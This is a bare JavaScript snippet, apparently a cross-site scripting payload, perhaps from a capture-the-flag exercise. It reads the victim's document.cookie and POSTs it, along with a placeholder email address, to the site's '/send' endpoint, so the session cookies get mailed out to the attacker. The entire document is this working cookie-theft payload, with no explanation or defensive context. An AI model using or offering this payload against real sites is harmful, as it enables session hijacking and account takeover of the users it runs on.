const data = new FormData();
data.append('mail', 'wut@wut.wut');
data.append('contents', document.cookie);

fetch('/send', {
  method: 'POST',
  body: data,
  credentials: 'same-origin',
  headers: {
    'Cookie': document.cookie,
  },
});
